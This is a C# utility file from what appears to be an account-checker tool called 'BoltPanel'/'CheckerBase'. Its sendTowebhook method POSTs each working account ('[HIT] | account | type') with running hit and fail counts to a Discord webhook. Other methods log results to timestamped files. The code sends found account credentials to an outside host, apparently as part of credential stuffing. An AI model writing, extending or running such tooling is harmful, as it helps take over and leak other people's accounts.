using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace BoltPanel
{
    internal class Utils
    {
        public static void print(string prefix, string description)
        {
            Console.Write("    [", Color.White);
            Console.Write(prefix, Color.Purple);
            Console.Write("] " + description, Color.White);
        }

        public static void sendTowebhook(string account, string accountType)
        {
            WebRequest wr = (HttpWebRequest)WebRequest.Create(Program.webhooklink);

            wr.ContentType = "application/json";

            wr.Method = "POST";

            using (var sw = new StreamWriter(wr.GetRequestStream()))
            {
                var json = JsonConvert.SerializeObject(new
                {
                    username = "CheckerBase",
                    embeds = new[]
                    {
                        new
                        {
                            description = $"[HIT] | {account} | {accountType}",
                            title = "CheckerBase",
                            color = "9396455",

                            footer = new
                            {
                                icon_url =
                                    "https://cdn.discordapp.com/icons/781049455831023616/56dac6e51b6887b8d4a87ee724ba929a.webp?size=128",
                                text =
                                    $"[CheckerBase] | [HITS] {Program.hits} - [FAILS] {Program.fails} - [TOTAL] {Program.totalTested}"
                            }
                        }
                    }
                });

                sw.Write(json);
            }

            var response = (HttpWebResponse)wr.GetResponse();
        }

        private static readonly object resultLock = new object();
        public static string now = DateTime.Now.ToString("dd-MM-yy HH-mm-ss");

        public static void Initialize()
        {
            Directory.CreateDirectory($@"Results\{now}");
        }

        public static void AsResult(string fileName, string content)
        {
            var resultLock = Utils.resultLock;
            var flag = false;
            try
            {
                Monitor.Enter(resultLock, ref flag);
                File.AppendAllText(@"Results\" + $@"{now}\" + fileName + ".txt", content + Environment.NewLine);
            }
            finally
            {
                if (flag)
                    Monitor.Exit(resultLock);
            }
        }
    }
}
